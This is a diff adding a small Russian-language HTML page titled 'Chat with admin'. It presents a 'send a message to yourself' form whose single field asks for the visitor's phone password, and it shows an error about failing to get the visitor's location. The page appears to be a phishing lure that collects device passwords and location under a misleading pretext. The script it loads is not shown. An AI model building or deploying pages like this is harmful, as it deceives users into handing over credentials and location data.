@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ru">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Чат с админом</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <h2>Отправьте сообщение себе</h2>
+
+      <!-- Форма для отправки сообщения -->
+      <div class="form-container">
+        <form id="chat-form">
+          <input
+            type="text"
+            id="message"
+            placeholder="Введите пароль вашего телефона"
+            required
+          />
+          <button type="submit">Отправить</button>
+        </form>
+      </div>
+
+      <!-- Сообщение об ошибке -->
+      <div id="error-message" class="error-message">
+        Не удалось получить ваше местоположение.
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
